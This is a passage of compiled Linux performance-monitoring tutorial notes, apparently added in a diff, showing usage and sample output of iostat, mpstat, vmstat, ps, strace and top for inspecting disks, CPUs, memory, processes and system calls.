+sdc             408.03       207.05       972.42  513364213 2411023092
+sdc1            408.03       207.03       972.42  513308749 2411023092
+
+By default iostat displays I/O data for all the disks available in the system. 
+To view statistics for a specific device (For example, /dev/sda), use the option -p as shown below.
+
+$ iostat -p sda
+Linux 2.6.32-100.28.5.el6.x86_64 (dev-db)       07/09/2011
+
+avg-cpu:  %user   %nice %system %iowait  %steal   %idle
+           5.68    0.00    0.52    2.03    0.00   91.76
+
+Device:            tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn
+sda             194.69      1096.51      1598.48 2719069928 3963829584
+sda2            336.38        27.17        54.00   67365064  133905080
+sda1            821.89         0.69       243.53    1720833  603892838
+
+* Mpstat
+
+mpstat reports processors statistics. The following are some of mpstat command examples.
+
+Option -A, displays all the information that can be displayed by the mpstat command as shown below. This is really equivalent to “mpstat -I ALL -u -P ALL” command.
+
+$ mpstat -A
+Linux 2.6.32-100.28.5.el6.x86_64 (dev-db)       07/09/2011      _x86_64_        (4 CPU)
+
+10:26:34 PM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest   %idle
+10:26:34 PM  all    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00   99.99
+10:26:34 PM    0    0.01    0.00    0.01    0.01    0.00    0.00    0.00    0.00   99.98
+10:26:34 PM    1    0.00    0.00    0.01    0.00    0.00    0.00    0.00    0.00   99.98
+10:26:34 PM    2    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
+10:26:34 PM    3    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
+
+10:26:34 PM  CPU    intr/s
+10:26:34 PM  all     36.51
+10:26:34 PM    0      0.00
+10:26:34 PM    1      0.00
+10:26:34 PM    2      0.04
+10:26:34 PM    3      0.00
+
+10:26:34 PM  CPU     0/s     1/s     8/s     9/s    12/s    14/s    15/s    16/s    19/s    20/s    21/s    33/s   NMI/s   LOC/s   SPU/s   PMI/s   PND/s   RES/s   CAL/s   TLB/s   TRM/s   THR/s   MCE/s   MCP/s   ERR/s   MIS/s
+10:26:34 PM    0    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    7.47    0.00    0.00    0.00    0.00    0.02    0.00    0.00    0.00    0.00    0.00    0.00    0.00
+10:26:34 PM    1    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    4.90    0.00    0.00    0.00    0.00    0.03    0.00    0.00    0.00    0.00    0.00    0.00    0.00
+10:26:34 PM    2    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.04    0.00    0.00    0.00    0.00    0.00    3.32    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00
+
+mpstat Option -P ALL, displays all the individual CPUs (or Cores) along with its statistics as shown below.
+
+$ mpstat -P ALL
+Linux 2.6.32-100.28.5.el6.x86_64 (dev-db)       07/09/2011      _x86_64_        (4 CPU)
+
+10:28:04 PM  CPU    %usr   %nice    %sys %iowait    %irq   %soft  %steal  %guest   %idle
+10:28:04 PM  all    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00   99.99
+10:28:04 PM    0    0.01    0.00    0.01    0.01    0.00    0.00    0.00    0.00   99.98
+10:28:04 PM    1    0.00    0.00    0.01    0.00    0.00    0.00    0.00    0.00   99.98
+10:28:04 PM    2    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
+10:28:04 PM    3    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00  100.00
+
+* Vmstat
+
+vmstat reports virtual memory statistics. The following are some of vmstat command examples.
+
+vmstat by default will display the memory usage (including swap) as shown below.
+
+$ vmstat
+procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu------
+ r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
+ 0  0 305416 260688  29160 2356920    2    2     4     1    0    0  6  1 92  2  0
+
+To execute vmstat every 2 seconds for 10 times, do the following. After executing 10 times, it will stop automatically.
+$ vmstat 2 10
+procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu-----
+ r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
+ 1  0      0 537144 182736 6789320    0    0     0     0    1    1  0  0 100  0  0
+ 0  0      0 537004 182736 6789320    0    0     0     0   50   32  0  0 100  0  0
+..
+
+iostat and vmstat are part of the sar utility. You should install sysstat package to get iostat and vmstat working.
+
+* ps
+Process is a running instance of a program. Linux is a multitasking operating system, which means that more than one process can be active at once. Use ps command to find out what processes are running on your system.
+
+This article explains 7 practical usages of ps command and its options.
+
+To monitor and control the processes, Linux provides lot of commands such as ps, kill, killall, nice, renice and top commands.
+1. List Currently Running Processes (ps -ef, ps -aux)
+
+Its a commonly used example with a ps command to list down all the process which are currently running in a machine. The following example shows the options of ps command to get all the processes.
+
+$ ps -ef
+root     26551     5  0 Feb10 ?        00:03:41 [pdflush]
+root     26570     5  0 Feb10 ?        00:00:20 [pdflush]
+root     30344  3382  0 Feb21 ?        00:00:11 sshd: root@pts/14
+root     30365 30344  0 Feb21 pts/14   00:00:02 -bash
+root     30393  3382  0 Feb21 ?        00:00:10 sshd: root@pts/15
+
+Where:
+
+    -e to display all the processes.
+    -f to display full format listing.
+
+In case of BSD machines, you can use ‘ps -aux’ will give the details about all the process as shown above.
+
+$ ps -aux
+
+2. List the Process based on the UID and Commands (ps -u, ps -C)
+
+Use -u option to displays the process that belongs to a specific username. When you have multiple username, separate them using a comma. The example below displays all the process that are owned by user wwwrun, or postfix.
+
+$ ps -f -u wwwrun,postfix
+UID        PID  PPID  C STIME TTY          TIME CMD
+postfix   7457  7435  0 Mar09 ?        00:00:00 qmgr -l -t fifo -u
+wwwrun    7495  7491  0 Mar09 ?        00:00:00 /usr/sbin/httpd2-prefork -f /etc/apache2/httpd.conf
+wwwrun    7496  7491  0 Mar09 ?        00:00:00 /usr/sbin/httpd2-prefork -f /etc/apache2/httpd.conf
+wwwrun    7497  7491  0 Mar09 ?        00:00:00 /usr/sbin/httpd2-prefork -f /etc/apache2/httpd.conf
+wwwrun    7498  7491  0 Mar09 ?        00:00:00 /usr/sbin/httpd2-prefork -f /etc/apache2/httpd.conf
+wwwrun    7499  7491  0 Mar09 ?        00:00:00 /usr/sbin/httpd2-prefork -f /etc/apache2/httpd.conf
+wwwrun   10078  7491  0 Mar09 ?        00:00:00 /usr/sbin/httpd2-prefork -f /etc/apache2/httpd.conf
+wwwrun   10082  7491  0 Mar09 ?        00:00:00 /usr/sbin/httpd2-prefork -f /etc/apache2/httpd.conf
+postfix  15677  7435  0 22:23 ?        00:00:00 pickup -l -t fifo -u
+
+Often ps is used with grep like “ps -aux | grep command” to get the list of process with the given command.
+
+But ps command itself has an option to achieve the same. The following example shows that all the processes which has tatad.pl in its command execution.
+
+$ ps -f -C tatad.pl
+UID        PID  PPID  C STIME TTY          TIME CMD
+root      9576     1  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9577  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9579  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9580  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9581  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9582  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root     12133  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+
+Note: We can create aliases for ps command to list processes based on commands, users or groups.
+3. List the processes based on PIDs or PPIDs (ps -p, ps –ppid)
+
+Each process will be assigned with the unique Process ID (PID).
+
+When you launch some application, it might fork number of processes and each sub process will have its own PID. So, each process will have its own process id and parent processid.
+
+For all the processes that a process forks will have the same PPID (parent process identifier). The following method is used to get a list of processes with a particular PPID.
+
+$ ps -f --ppid 9576
+UID        PID  PPID  C STIME TTY          TIME CMD
+root      9577  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9579  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9580  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9581  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root      9582  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+root     12133  9576  0 Mar09 ?        00:00:00 /opt/tata/perl/bin/perl /opt/tata/bin/tatad.pl
+
+The following example is to list the processes which has given PID.
+
+$ ps -f  -p 25009,7258,2426
+UID        PID  PPID  C STIME TTY          TIME CMD
+root      2426     4  0 Mar09 ?        00:00:00 [reiserfs/0]
+root      7258     1  0 Mar09 ?        00:00:00 /usr/sbin/nscd
+postfix  25009  7435  0 00:02 ?        00:00:00 pickup -l -t fifo -u
+
+4. List Processes in a Hierarchy (ps –forest)
+
+The example below display the process Id and commands in a hierarchy. –forest is an argument to ps command which displays ASCII art of process tree. From this tree, we can identify which is the parent process and the child processes it forked in a recursive manner.
+
+$ ps -e -o pid,args --forest
+  468  \_ sshd: root@pts/7
+  514  |   \_ -bash
+17484  \_ sshd: root@pts/11
+17513  |   \_ -bash
+24004  |       \_ vi ./790310__11117/journal
+15513  \_ sshd: root@pts/1
+15522  |   \_ -bash
+ 4280  \_ sshd: root@pts/5
+ 4302  |   \_ -bash
+
+Note: You can also use tree and pstree command to displays process in a nice tree structure.
+5. List elapsed wall time for processes (ps -o pid,etime=)
+
+If you want the get the elapsed time for the processes which are currently running ps command provides etime which provides the elapsed time since the process was started, in the form [[dd-]hh:]mm:ss.
+
+The below command displays the elapsed time for the process IDs 1 (init) and process id 29675.
+
+For example “10-22:13:29″ in the output represents the process init is running for 10days, 22hours,13 minutes and 29seconds. Since init process starts during the system startup, this time will be same as the output of the ‘uptime’ command.
+
+# ps -p 1,29675 -o pid,etime=
+  PID
+    1 10-22:13:29
+29675  1-02:58:46
+
+6. List all threads for a particular process (ps -L)
+
+You can get a list of threads for the processes. 
+When a process hangs, we might need to identify the list of threads running for a particular process as shown below.
+
+ $ ps -C java -L -o pid,tid,pcpu,state,nlwp,args
+  PID   TID %CPU S NLWP COMMAND
+16992 16992  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 16993  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 16994  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 16995  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 16996  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 16997  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 16998  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 16999  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 17000  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 17001  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 17002  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 17003  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 17024  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 15753  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+16992 15754  0.0 S   15 ../jre/bin/java -Djava.ext.dirs=../jre/lib/ext:../lib:../auto_lib -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006
+
+-L option is used to display the list of threads for a process which has the command given. 
+And it also displays nlwp, which represents number of light weight processes. 
+In the above example, a total of 15 java threads are running.
+7. Finding memory Leak (ps –sort pmem)
+
+A memory leak, technically, is an ever-increasing usage of memory by an application.
+
+With common desktop applications, this may go unnoticed, 
+because a process typically frees any memory it has used when you close the application.
+
+However, In the client/server model, memory leakage is a serious issue,
+ because applications are expected to be available 24×7. 
+Applications must not continue to increase their memory usage indefinitely, 
+because this can cause serious issues. To monitor such memory leaks, we can use the following commands.
+
+$ ps aux --sort pmem
+
+USER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.0  1520  508 ?        S     2005   1:27 init
+inst  1309  0.0  0.4 344308 33048 ?      S     2005   1:55 agnt (idle)
+inst  2919  0.0  0.4 345580 37368 ?      S     2005  20:02 agnt (idle)
+inst 24594  0.0  0.4 345068 36960 ?      S     2005  15:45 agnt (idle)
+root 27645  0.0 14.4 1231288 1183976 ?   S     2005   3:01 /TaskServer/bin/./wrapper-linux-x86-32
+
+In the above ps command, –sort option outputs the highest %MEM at bottom. 
+Just note down the PID for the highest %MEM usage. 
+Then use ps command to view all the details about this process id, and monitor the change over time. 
+You had to manually repeat ir or put it as a cron to a file.
+
+$ ps ev --pid=27645
+PID TTY STAT TIME MAJFL TRS DRS RSS %MEM COMMAND
+27645 ? S 3:01 0 25 1231262 1183976 14.4 /TaskServer/bin/./wrapper-linux-x86-32
+
+$ ps ev --pid=27645
+PID TTY STAT TIME MAJFL TRS DRS RSS %MEM COMMAND
+27645 ? S 3:01 0 25 1231262 1183976 14.4 /TaskServer/bin/./wrapper-linux-x86-32
+
+Note: In the above output, if RSS (resident set size, in KB) increases over time (so would %MEM),
+ it may indicate a memory leak in the application.
+
+* strace
+Strace is a debugging tool that will help you troubleshoot issues.
+
+Strace monitors the system calls and signals of a specific program. It is helpful when you do not have the source code and would like to debug the execution of a program. strace provides you the execution sequence of a binary from start to end.
+
+This article explains 7 strace examples to get you started.
+1. Trace the Execution of an Executable
+
+You can use strace command to trace the execution of any executable. The following example shows the output of strace for the Linux ls command.
+
+$  strace ls
+execve("/bin/ls", ["ls"], [/* 21 vars */]) = 0
+brk(0)                                  = 0x8c31000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb78c7000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=65354, ...}) = 0
+...
+...
+...
+
+2. Trace a Specific System Calls in an Executable Using Option -e
+
+Be default, strace displays all system calls for the given executable. To display only a specific system call, use the strace -e option as shown below.
+
+$ strace -e open ls
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+open("/lib/libselinux.so.1", O_RDONLY)  = 3
+open("/lib/librt.so.1", O_RDONLY)       = 3
+open("/lib/libacl.so.1", O_RDONLY)      = 3
+open("/lib/libc.so.6", O_RDONLY)        = 3
+open("/lib/libdl.so.2", O_RDONLY)       = 3
+open("/lib/libpthread.so.0", O_RDONLY)  = 3
+open("/lib/libattr.so.1", O_RDONLY)     = 3
+open("/proc/filesystems", O_RDONLY|O_LARGEFILE) = 3
+open("/usr/lib/locale/locale-archive", O_RDONLY|O_LARGEFILE) = 3
+open(".", O_RDONLY|O_NONBLOCK|O_LARGEFILE|O_DIRECTORY|O_CLOEXEC) = 3
+Desktop  Documents  Downloads  examples.desktop  libflashplayer.so
+Music  Pictures  Public  Templates  Ubuntu_OS  Videos
+
+The above output displays only the open system call of the ls command. At the end of the strace output, it also displays the output of the ls command.
+
+If you want to trace multiple system calls use the “-e trace=” option. The following example displays both open and read system calls.
+
+$ strace -e trace=open,read ls /home
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+open("/lib/libselinux.so.1", O_RDONLY)  = 3
+read(3, "\177ELF\1\1\1\3\3\1\260G004"..., 512) = 512
+open("/lib/librt.so.1", O_RDONLY)       = 3
+read(3, "\177ELF\1\1\1\3\3\1\300\30004"..., 512) = 512
+..
+open("/lib/libattr.so.1", O_RDONLY)     = 3
+read(3, "\177ELF\1\1\1\3\3\1\360\r004"..., 512) = 512
+open("/proc/filesystems", O_RDONLY|O_LARGEFILE) = 3
+read(3, "nodev\tsysfs\nnodev\trootfs\nnodev\tb"..., 1024) = 315
+read(3, "", 1024)                       = 0
+open("/usr/lib/locale/locale-archive", O_RDONLY|O_LARGEFILE) = 3
+open("/home", O_RDONLY|O_NONBLOCK|O_LARGEFILE|O_DIRECTORY|O_CLOEXEC) = 3
+bala
+
+3. Save the Trace Execution to a File Using Option -o
+
+The following examples stores the strace output to output.txt file.
+
+$ strace -o output.txt ls
+Desktop  Documents  Downloads  examples.desktop  libflashplayer.so
+Music  output.txt  Pictures  Public  Templates  Ubuntu_OS  Videos
+
+$ cat output.txt
+execve("/bin/ls", ["ls"], [/* 37 vars */]) = 0
+brk(0)                                  = 0x8637000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 8192, PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7860000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=67188, ...}) = 0
+...
+...
+
+4. Execute Strace on a Running Linux Process Using Option -p
+
+You could execute strace on a program that is already running using the process id. First, identify the PID of a program using ps command.
+
+For example, if you want to do strace on the firefox program that is currently running, identify the PID of the firefox program.
+
+$ ps -C firefox-bin
+  PID TTY          TIME CMD
+ 1725 ?        00:40:50 firefox-bin
+
+Use strace -p option as shown below to display the strace for a given process id.
+
+$  sudo strace -p 1725 -o firefox_trace.txt
+
+$ tail -f firefox_trace.txt
+
+Now the execution trace of firefox process will be logged into firefox_trace.txt text file. You can tail this text file to watch the live trace of the firefox executable.
+
+Strace will display the following error when your user id does not match the user id of the given process.
+
+$  strace -p 1725 -o output.txt
+attach: ptrace(PTRACE_ATTACH, ...): Operation not permitted
+Could not attach to process.  If your uid matches the uid of the target
+process, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try
+again as the root user.  For more details, see /etc/sysctl.d/10-ptrace.conf
+
+5. Print Timestamp for Each Trace Output Line Using Option -t
+
+To print the timestamp for each strace output line, use the option -t as shown below.
+
+$ strace -t -e open ls /home
+20:42:37 open("/etc/ld.so.cache", O_RDONLY) = 3
+20:42:37 open("/lib/libselinux.so.1", O_RDONLY) = 3
+20:42:37 open("/lib/librt.so.1", O_RDONLY) = 3
+20:42:37 open("/lib/libacl.so.1", O_RDONLY) = 3
+20:42:37 open("/lib/libc.so.6", O_RDONLY) = 3
+20:42:37 open("/lib/libdl.so.2", O_RDONLY) = 3
+20:42:37 open("/lib/libpthread.so.0", O_RDONLY) = 3
+20:42:37 open("/lib/libattr.so.1", O_RDONLY) = 3
+20:42:37 open("/proc/filesystems", O_RDONLY|O_LARGEFILE) = 3
+20:42:37 open("/usr/lib/locale/locale-archive", O_RDONLY|O_LARGEFILE) = 3
+20:42:37 open("/home", O_RDONLY|O_NONBLOCK|O_LARGEFILE|O_DIRECTORY|O_CLOEXEC) = 3
+bala
+
+6. Print Relative Time for System Calls Using Option -r
+
+Strace also has the option to print the execution time for each system calls as shown below.
+
+$ strace -r ls
+     0.000000 execve("/bin/ls", ["ls"], [/* 37 vars */]) = 0
+     0.000846 brk(0)                    = 0x8418000
+     0.000143 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+     0.000163 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb787b000
+     0.000119 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+     0.000123 open("/etc/ld.so.cache", O_RDONLY) = 3
+     0.000099 fstat64(3, {st_mode=S_IFREG|0644, st_size=67188, ...}) = 0
+     0.000155 mmap2(NULL, 67188, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb786a000
+     ...
+     ...
+
+7. Generate Statistics Report of System Calls Using Option -c
+
+Using option -c, strace provides useful statistical report for the execution trace. The “calls” column in the following output indicated how many times that particular system call was executed.
+
+$ strace -c ls /home
+bala
+% time     seconds  usecs/call     calls    errors syscall
+------ ----------- ----------- --------- --------- ----------------
+  -nan    0.000000           0         9           read
+  -nan    0.000000           0         1           write
+  -nan    0.000000           0        11           open
+  -nan    0.000000           0        13           close
+  -nan    0.000000           0         1           execve
+  -nan    0.000000           0         9         9 access
+  -nan    0.000000           0         3           brk
+  -nan    0.000000           0         2           ioctl
+  -nan    0.000000           0         3           munmap
+  -nan    0.000000           0         1           uname
+  -nan    0.000000           0        11           mprotect
+  -nan    0.000000           0         2           rt_sigaction
+  -nan    0.000000           0         1           rt_sigprocmask
+  -nan    0.000000           0         1           getrlimit
+  -nan    0.000000           0        25           mmap2
+  -nan    0.000000           0         1           stat64
+  -nan    0.000000           0        11           fstat64
+  -nan    0.000000           0         2           getdents64
+  -nan    0.000000           0         1           fcntl64
+  -nan    0.000000           0         2         1 futex
+  -nan    0.000000           0         1           set_thread_area
+  -nan    0.000000           0         1           set_tid_address
+  -nan    0.000000           0         1           statfs64
+  -nan    0.000000           0         1           set_robust_list
+------ ----------- ----------- --------- --------- ----------------
+100.00    0.000000                   114        10 total
+
+* top
+
+In this article, let us review 15 examples for Linux top command that will be helpful for both newbies and experts.
+** Get a quick command line option help using top -h as shown below.
+
+$ top -h
+        top: procps version 3.2.0
+usage:  top -hv | -bcisS -d delay -n iterations [-u user | -U user] -p pid [,pid ...]
+
+Press h while top command is running, which will display help for interactive top commands.
+
+Help for Interactive Commands - procps version 3.2.0
+Window 1:Def: Cumulative mode Off.  System: Delay 3.0 secs; Secure mode Off.
+
+  Z,B       Global: 'Z' change color mappings; 'B' disable/enable bold
+  l,t,m     Toggle Summaries: 'l' load avg; 't' task/cpu stats; 'm' mem info
+  1,I       Toggle SMP view: '1' single/separate states; 'I' Irix/Solaris mode
+  ..........
+
+** Show Processes Sorted by any Top Output Column – Press O
+
+By default top command displays the processes in the order of CPU usage.  
+When the top command is running, press M (upper-case) to display processes sorted by memory usage as shown below.
+Top Command Sort By Memory Usage
+
+Fig: Press M to sort by memory usage – Unix top command
+
+To sort top output by any column, Press O (upper-case O) , 
+which will display all the possible columns that you can sort by as shown below.
+
+Current Sort Field:  P  for window 1:Def
+Select sort field via field letter, type any other key to return 
+
+  a: PID        = Process Id              v: nDRT       = Dirty Pages count
+  d: UID        = User Id                 y: WCHAN      = Sleeping in Function
+  e: USER       = User Name               z: Flags      = Task Flags
+  ........
+
+When the linux top command is running, Press R, which does the sort in reverse order.
+** Kill a Task Without Exiting From Top – Press k
+
+Once you’ve located a process that needs to be killed, press ‘k’ which will ask for the process id, and signal to send.  
+If you have the privilege to kill that particular PID, it will get killed successfully.
+
+PID to kill: 1309
+Kill PID 1309 with signal [15]: 
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
+ 1309 geek   23   0 2483m 1.7g  27m S    0 21.8  45:31.32 gagent
+ 1882 geek   25   0 2485m 1.7g  26m S    0 21.7  22:38.97 gagent
+ 5136 root    16   0 38040  14m 9836 S    0  0.2   0:00.39 nautilus
+
+3. Renice a Unix Process Without Exiting From Top – Press r
+
+Press r, if you want to just change the priority of the process (and not kill the process). 
+This will ask PID for renice, enter the PID and priority.
+
+
+PID to renice: 1309
+Renice PID 1309 to value: 
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
+ 1309 geek   23   0 2483m 1.7g  27m S    0 21.8  45:31.32 gagent
+ 1882 geek   25   0 2485m 1.7g  26m S    0 21.7  22:38.97 gagent
+
+** Display Selected User in Top Output Using top -u
+
+ Use top -u to display a specific user processes only in the top command output.
+
+$ top -u geek
+
+While unix top command is running, press u which will ask for username as shown below.
+
+Which user (blank for all): geek
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
+ 1309 geek   23   0 2483m 1.7g  27m S    0 21.8  45:31.32 gagent
+ 1882 geek   25   0 2485m 1.7g  26m S    0 21.7  22:38.97 gagent
+
+** Display Only Specific Process with Given PIDs Using top -p
+
+Use top -p as shown below to display specific PIDs.
+
+$ top -p 1309, 1882
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
+ 1309 geek   23   0 2483m 1.7g  27m S    0 21.8  45:31.32 gagent
+ 1882 geek   25   0 2485m 1.7g  26m S    0 21.7  22:38.97 gagent
+
+** Display All CPUs / Cores in the Top Output – Press 1 (one)
+
+Top output by default shows CPU line for all the CPUs combined together as shown below.
+
+top - 20:10:39 up 40 days, 23:02,  1 user,  load average: 4.97, 2.01, 1.25
+Tasks: 310 total,   1 running, 309 sleeping,   0 stopped,   0 zombie
+Cpu(s):  0.5%us,  0.7%sy,  0.0%ni, 92.3%id,  6.4%wa,  0.0%hi,  0.0%si,  0.0%st
+
+Press 1 (one), when the top command is running, which will break the CPU down and show details for all the individual CPUs running on the system as shown below.
+
+top - 20:10:07 up 40 days, 23:03,  1 user,  load average: 5.32, 2.38, 1.39
+Tasks: 341 total,   3 running, 337 sleeping,   0 stopped,   1 zombie
+Cpu0  :  7.7%us,  1.7%sy,  0.0%ni, 79.5%id, 11.1%wa,  0.0%hi,  0.0%si,  0.0%st
+Cpu1  :  0.3%us,  0.0%sy,  0.0%ni, 94.9%id,  4.7%wa,  0.0%hi,  0.0%si,  0.0%st
+Cpu2 :  3.3%us,  0.7%sy,  0.0%ni, 55.7%id, 40.3%wa,  0.0%hi,  0.0%si,  0.0%st
+Cpu3 :  5.0%us,  1.0%sy,  0.0%ni, 86.2%id,  7.4%wa,  0.0%hi,  0.3%si,  0.0%st
+Cpu4  : 38.5%us,  5.4%sy,  0.3%ni,  0.0%id, 54.8%wa,  0.0%hi,  1.0%si,  0.0%st
+Cpu5  :  0.0%us,  0.0%sy,  0.0%ni,100.0%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st
+Cpu6  :  0.3%us,  0.7%sy,  0.0%ni, 97.3%id,  1.7%wa,  0.0%hi,  0.0%si,  0.0%st
+Cpu7  :  5.4%us,  4.4%sy,  0.0%ni, 82.6%id,  7.7%wa,  0.0%hi,  0.0%si,  0.0%st
+Cpu8 :  1.7%us,  1.7%sy,  0.0%ni, 72.8%id, 23.8%wa,  0.0%hi,  0.0%si,  0.0%st
+
+** Refresh Unix Top Command Output On demand (or) Change Refresh Interval
+
+By default, linux top command updates the output every 3.0 seconds. When you want to update the output on-demand, press space bar.
+
+To change the output update frequency, press d in interactive mode, and enter the time in seconds as shown below.
+
+Change delay from 3.0 to: 10
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
+ 1309 geek   23   0 2483m 1.7g  27m S    0 21.8  45:31.32 gagent
+ 1882 geek   25   0 2485m 1.7g  26m S    0 21.7  22:38.97 gagent
+
+** Highlight Running Processes in the Linux Top Command Output – Press z or b
+
+Press z or b, which will highlight all running process as shown below.
+Highlight Running Process on Ubuntu Linux Using Top Command
+
+Fig: Ubuntu Linux – top command highlights running process
+** Display Absolute Path of the Command and its Arguments – Press c
+
+Press c which will show / hide command absolute path, and arguments as shown below.
+
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND
+ 1309 geek   23   0 2483m 1.7g  27m S    0 21.8  45:31.32 /usr/sbin/gagent
